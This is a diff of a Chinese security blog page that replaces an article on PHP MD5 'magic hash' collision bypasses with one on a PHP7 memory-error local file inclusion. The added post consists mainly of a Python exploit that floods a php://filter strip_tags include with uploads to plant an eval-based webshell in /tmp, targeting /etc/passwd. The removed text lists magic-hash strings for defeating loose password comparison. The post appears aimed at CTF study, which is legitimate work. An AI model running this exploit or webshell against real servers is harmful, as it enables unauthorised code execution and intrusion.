@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="MD5碰撞, Keep-Boom">
+    <meta name="keywords" content="php7内存错误LFI, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>MD5碰撞 | Keep-Boom</title>
+    <title>php7内存错误LFI | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">MD5碰撞</h1>
+                    <h1 class="description center-align post-title">php7内存错误LFI</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-21
+                    2021-07-07
                 </div>
                 
 
@@ -459,42 +459,42 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>PHP在处理哈希字符串时，</p>
-<p>会利用”**!=<strong>”或”</strong>==<strong>”来对哈希值进行比较，它把每一个以”</strong>0E<strong>”开头的哈希值都解释为</strong>0<strong>，所以如果两个不同的密码经过哈希以后，其哈希值都是以”</strong>0E**”开头的，那么PHP将会认为他们相同，都是0。</p>
-<p>“<strong>===</strong>“和”<strong>!==</strong>“即strict比较符，只有在类型相同时才相等。”<strong>==</strong>“和”<strong>!=</strong>“即non-strict比较符，会在类型转换后进行比较。</p>
-<p>此外0 == 字符会被认为是正确的，可以绕过验证</p>
-<p><strong>字母数字混合类（MD5值）：</strong></p>
-<p>s878926199a</p>
-<p>0e545993274517709034328855841020</p>
-<p>s155964671a</p>
-<p>0e342768416822451524974117254469</p>
-<p>s214587387a</p>
-<p>0e848240448830537924465865611904</p>
-<p><strong>大写字母类：</strong></p>
-<p>QLTHNDT</p>
-<p>0e405967825401955372549139051580 </p>
-<p>QNKCDZO</p>
-<p>0e830400451993494058024219903391 </p>
-<p>EEIZDOI</p>
-<p>0e782601363539291779881938479162</p>
-<p><strong>纯数字类：</strong></p>
-<p>240610708</p>
-<p>0e462097431906509019562988736854</p>
-<p><strong>i = = md5(i)</strong></p>
-<p>0e215962017</p>
-<p>0e291242476940776845150308577824</p>
-<p><strong>题目 ctfshow_web5</strong></p>
-<p><strong>md4加密</strong></p>
-<p>0e251288019</p>
-<p> 0e874956163641961271069404332409</p>
-<p><strong>sha1碰撞</strong></p>
-<pre><code>aaroZmOk
-aaK1STfY
-aaO8zKZF
-aa3OFF9m</code></pre>
-<p>还可以用数组绕过</p>
-<p>参考文章</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/12309225.html">https://www.cnblogs.com/echoDetected/p/12309225.html</a></p>
+                <p><strong>原理</strong></p>
+<p>原理利用payload使服务器发生内存错误，此时同时上传一个文件(经过30秒左右才会被删除)</p>
+<p>临时文件生成在upload_tmp_dir指定路径下</p>
+<p>包含临时文件使之生成一个新的木马文件放在tmp目录下</p>
+<p><strong>exp</strong></p>
+<pre><code># -*- coding: utf-8 -*-
+
+import requests
+import string
+import itertools
+import base64
+
+host = &quot;192.168.1.100&quot;
+port = 80
+base_url = &quot;http://%s:%d&quot; % (host, port)
+
+
+def upload_file_to_include(url, file_content):
+    files = &#123;&#39;file&#39;: (&#39;0xEaS.jpg&#39;, file_content, &#39;image/jpeg&#39;)&#125;
+    try:
+        response = requests.post(url, files=files)
+
+    except Exception as error:
+        pass
+
+def generate_tmp_files():
+    webshell_content = base64.b64encode(&#39;&lt;?php eval($_REQUEST[&quot;0xEaS&quot;]);?&gt;&#39;.encode()).decode().strip()
+    file_content = &#39;&lt;?php if(file_put_contents(&quot;/tmp/0xEaS&quot;, base64_decode(&quot;%s&quot;)))&#123;echo &quot;Getshell success!&quot;;&#125;?&gt;&#39; % (webshell_content)
+    phpinfo_url = &quot;%s/?file=php://filter/string.strip_tags/resource=/etc/passwd&quot; % (base_url) #file=index.php包含自身引发错误
+
+    for i in range(100):
+        print(&quot;[+] %d&quot; % i)
+        upload_file_to_include(phpinfo_url, file_content)
+
+if __name__ == &quot;__main__&quot;:
+    generate_tmp_files()</code></pre>
 
             </div>
             <hr/>
@@ -520,7 +520,7 @@ aa3OFF9m</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/04/21/MD5%E7%A2%B0%E6%92%9E/">http://example.com/2021/04/21/MD5%E7%A2%B0%E6%92%9E/</a>
+                    <a href="http://example.com/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/">http://example.com/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -725,54 +725,18 @@ aa3OFF9m</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/05/12/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">
+                <a href="/2021/07/07/php7%E5%86%85%E5%AD%98%E9%94%99%E8%AF%AFLFI/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="CBC翻转攻击">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="php7内存错误LFI">
                         
-                        <span class="card-title">CBC翻转攻击</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-12
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chan.Joy
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/04/19/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="PHP变量覆盖">
-                        
-                        <span class="card-title">PHP变量覆盖</span>
+                        <span class="card-title">php7内存错误LFI</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -783,7 +747,45 @@ aa3OFF9m</code></pre>
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chan.Joy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/05/27/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="cve-2018-12613-PhpMyadmin后台文件包含">
+                        
+                        <span class="card-title">cve-2018-12613-PhpMyadmin后台文件包含</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-27
                             </span>
                         <span class="publish-author">
                             
